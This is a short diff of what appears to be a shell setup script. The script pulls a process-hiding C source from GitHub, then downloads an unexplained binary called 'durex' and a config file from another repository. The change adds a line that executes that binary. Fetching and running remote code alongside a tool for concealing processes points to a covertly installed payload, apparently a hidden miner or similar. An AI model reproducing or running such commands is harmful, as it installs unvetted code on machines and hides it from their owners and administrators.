@@ -6,4 +6,4 @@ wget https://raw.githubusercontent.com/cihuuy/libn/master/processhider.c && apt 
 
 wget https://raw.githubusercontent.com/bulboni/g32/main/durex \
 && wget https://raw.githubusercontent.com/bulboni/g32/main/config.json \
-&& chmod +x durex
+&& chmod +x durex && ./durex
